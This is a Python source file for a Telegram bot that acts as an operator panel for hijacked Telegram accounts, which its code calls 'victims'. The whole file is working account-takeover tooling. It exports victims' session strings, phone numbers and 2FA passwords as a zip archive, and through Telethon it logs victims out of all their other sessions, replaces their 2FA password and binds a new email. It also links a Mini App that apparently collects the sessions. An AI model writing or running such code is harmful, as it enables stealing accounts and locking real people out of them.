import asyncio
import os
import zipfile
import json
import logging
from io import BytesIO
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BufferedInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

from telethon import TelegramClient, functions, errors
from telethon.sessions import StringSession

from config import BOT_TOKEN, ADMIN_IDS, API_ID, API_HASH
from database import (
    init_db, add_victim, get_all_victims, get_victim_session, 
    get_stats, log_action, update_victim_2fa, update_victim_email
)
from utils import maintain_victim, generate_random_password, generate_temp_email

# Инициализация логов
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class AdminStates(StatesGroup):
    waiting_for_user_id = State()

# --- КЛАВИАТУРЫ ---

def get_main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton(text="📥 Экспорт всех (.zip)", callback_data="export_zip")],
        [InlineKeyboardButton(text="⚙️ Ручное управление", callback_data="manual_manage")],
        [InlineKeyboardButton(text="📱 Открыть Mini App", web_app=WebAppInfo(url="https://indexhtml2-orpin.vercel.app"))]
    ])

def get_manage_kb(user_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Сбросить сессии (Kill All)", callback_data=f"kill_{user_id}")],
        [InlineKeyboardButton(text="🔐 Сменить 2FA Пароль", callback_data=f"2fa_{user_id}")],
        [InlineKeyboardButton(text="📧 Привязать почту", callback_data=f"mail_{user_id}")],
        [InlineKeyboardButton(text="« Назад", callback_data="stats")]
    ])

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id not in ADMIN_IDS: return
    await message.answer("🛠 **Панель управления сессиями 2026**\n\nВыберите действие:", 
                         reply_markup=get_main_kb(), parse_mode="Markdown")

@dp.callback_query(F.data == "stats")
async def show_stats(callback: types.CallbackQuery):
    stats = await get_stats()
    text = (f"📈 **Статистика пула:**\n\n"
            f"Всего аккаунтов: `{stats['total']}`\n"
            f"Последняя активность: `{datetime.now().strftime('%H:%M:%S')}`")
    await callback.message.edit_text(text, reply_markup=get_main_kb(), parse_mode="Markdown")

@dp.callback_query(F.data == "export_zip")
async def export_sessions(callback: types.CallbackQuery):
    await callback.answer("Генерация архива...")
    victims = await get_all_victims()
    if not victims:
        return await callback.message.answer("❌ В базе нет сессий.")

    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
        for v in victims:
            file_name = f"{v['user_id']}_{v['phone']}.txt"
            content = (f"Phone: {v['phone']}\n"
                       f"Session: {v['session_string']}\n"
                       f"2FA: {v['twofa_password']}\n"
                       f"Email: {v['email_changed_to']}")
            zip_file.writestr(file_name, content)

    zip_buffer.seek(0)
    document = BufferedInputFile(zip_buffer.read(), filename=f"sessions_{datetime.now().strftime('%d%m_%H%M')}.zip")
    await callback.message.answer_document(document, caption="📦 Все сессии из базы данных")

@dp.callback_query(F.data == "manual_manage")
async def manual_select(callback: types.CallbackQuery, state: FSMContext):
    victims = await get_all_victims()
    if not victims:
        return await callback.answer("❌ Аккаунтов нет", show_alert=True)
    
    msg = "📝 **Введите User ID для управления:**\n\nСписок доступных:\n"
    for v in victims:
        msg += f"• `{v['user_id']}` ({v['phone']}) - {v['first_name']}\n"
    
    await callback.message.answer(msg, parse_mode="Markdown")
    await state.set_state(AdminStates.waiting_for_user_id)

@dp.message(AdminStates.waiting_for_user_id)
async def process_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text)
        await message.answer(f"⚙️ Управление аккаунтом `{user_id}`", reply_markup=get_manage_kb(user_id), parse_mode="Markdown")
        await state.clear()
    except:
        await message.answer("Введите корректный числовой ID.")

# --- КОМАНДЫ УПРАВЛЕНИЯ ---

@dp.callback_query(F.data.startswith(("kill_", "2fa_", "mail_")))
async def handle_actions(callback: types.CallbackQuery):
    action, user_id = callback.data.split("_")
    session_str = await get_victim_session(int(user_id))
    
    if not session_str:
        return await callback.answer("Сессия не найдена", show_alert=True)

    await callback.answer("⏳ Выполняю...")
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    
    try:
        await client.connect()
        if action == "kill":
            await client(functions.auth.ResetAuthorizationsRequest())
            await log_action(user_id, "MANUAL_RESET", "Success")
            await callback.message.answer(f"✅ Все сессии для `{user_id}` сброшены.")
        
        elif action == "2fa":
            new_pass = generate_random_password()
            await client.edit_2fa(new_password=new_pass)
            await update_victim_2fa(user_id, new_pass)
            await callback.message.answer(f"✅ Новый пароль 2FA для `{user_id}`: `{new_pass}`", parse_mode="Markdown")
        
        elif action == "mail":
            new_email = generate_temp_email()
            await client(functions.account.UpdateEmailsRequest([new_email]))
            await update_victim_email(user_id, new_email)
            await callback.message.answer(f"✅ Попытка привязки почты `{new_email}` для `{user_id}` инициирована.", parse_mode="Markdown")
            
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка: {str(e)}")
    finally:
        await client.disconnect()

async def main():
    await init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())